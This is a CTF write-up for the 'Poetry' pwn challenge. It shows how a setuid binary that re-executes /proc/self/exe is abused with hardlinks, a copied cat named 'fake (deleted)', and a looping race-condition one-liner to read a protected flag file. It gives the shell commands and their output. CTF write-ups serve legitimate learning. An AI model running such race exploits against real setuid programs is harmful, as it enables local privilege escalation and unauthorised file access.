**Challenge: Poetry**

New PWN challenge.

Download the attachment and disassembly the file in IDA. We can see some potential problems here:

> .text:0000000000443A80                         __stack_chk_fail proc near              ; CODE XREF: main+13C↑p<br/>
> .text:0000000000443A80                         ; __unwind {<br/>
> .text:0000000000443A80 48 83 EC 08                             sub     rsp, 8<br/>
> .text:0000000000443A84 BF FF 56 4A 00                          mov     edi, offset aStackSmashingD ; "stack smashing detected"<br/>
> .text:0000000000443A89 E8 02 00 00 00                          call    __fortify_fail<br/>
> .text:0000000000443A89                         ; } // starts at 443A80<br/>
> .text:0000000000443A89                         __stack_chk_fail endp<br/>

So we have a Stack canary\cookie\fortify. It can be bypassed in some cases but for beginners it isnt easy. What this will do, if we find
some stack buffer overflow in the code it will only return to the address on the stack if the cookkie is valid. If not it will fail and your potential evil return address will never execute. So we will need to find something else to exploit this challenge.

Ok, lets connect to the server and see what is what.

> nc -v poetry.ctfcompetition.com 1337

If we execute some commands...

> DNS fwd/rev mismatch: poetry.ctfcompetition.com != 95.250.195.35.bc.googleusercontent.com<br/>
> poetry.ctfcompetition.com [35.195.250.95] 1337 (?) open<br/>
> id
> uid=1338(user) gid=1337(poetry) groups=1337(poetry)
> ls -la<br/>
> total 72<br/>
> ROOT_DIRECTORY<br/>
> cd home<br/>
> ls -la<br/>
> total 4<br/>
> HOME_DIRECTORY<br/>
> cd poetry<br/>
> ls -la<br/>
> total 900<br/>
> drwxr-xr-x 2 poetry poetry     80 Aug 14 13:44 .<br/>
> drwxrwxrwt 4 poetry poetry     80 Aug 14 13:44 ..<br/>
> -r-------- 1 poetry poetry     19 Aug 14 13:44 flag<br/>
> -rwsr-xr-x 1 poetry poetry 917192 Aug 14 13:44 poetry<br/>

Ok, so first we see we are logged in as "user" in "poetry" group. In the "poetry" home directory there is a flag which can be read only
by "poetry". But there is a twist. Binary that reads the flag is owned also by the "poetry" but it has SETUID flag. That basically means that if we run poetry binary now we will run it with higher privileges of the poetry group but we are still user and we have limited access. But the point is we can abuse SETUID to read the flag.

In the poetry binary we have LD_BIND_NOW. If we look how it works, it first gets the value of LD_BIND_NOW which forces the dynamic link loader to resolve all symbols on program start. Usually it resolves them when they are referenced as the program is running.

In our case, LD_BIND_NOW calls ("/proc/self/exe"), then sets LD_BIND_NOW and executes again.

This is weird since binary could just pass the path to execve. Why use this?

After some online research, I figured out that /proc/self/exe can point to /original/path (deleted) but our binary does not check it. So we can make a hardlink to it and fool it to read /poetry (deleted)

Connect to the server again and go to /home/user. Lets make a hardlink:

> cd /home/user<br/>
> ln /home/poetry/poetry ./fake<br/>
> ls -la<br/>
> total 896<br/>
> drwxrwxrwx 2 poetry poetry     60 Aug 14 14:08 .<br/>
> drwxrwxrwt 4 poetry poetry     80 Aug 14 14:07 ..<br/>
> -rwsr-xr-x 2 poetry poetry 917192 Aug 14 14:07 fake<br/>

Our fake has a SUID flag :D So now, lets copy our favorite CAT!

> cp /bin/cat 'fake (deleted')<br/>
> ls -la<br/>
> total 948<br/>
> drwxrwxrwx 2 poetry poetry     80 Aug 14 14:10 .<br/>
> drwxrwxrwt 4 poetry poetry     80 Aug 14 14:07 ..<br/>
> -rwsr-xr-x 2 poetry poetry 917192 Aug 14 14:07 fake<br/>
> -rwxr-xr-x 1 user   poetry  52080 Aug 14 14:10 fake (deleted)<br/>

Disconnect to clear the dirs.

Now we just need to Race! Because this is a Race condition exploit. Connect to server and input:

> cd /home/user<br/>
> cp /bin/cat 'fake (deleted)'<br/>
> while true; do ln /home/poetry/poetry ./fake; ( ./fake ../poetry/flag & ); rm fake; done<br/>

flag: CTF{CV3-2009-1894}




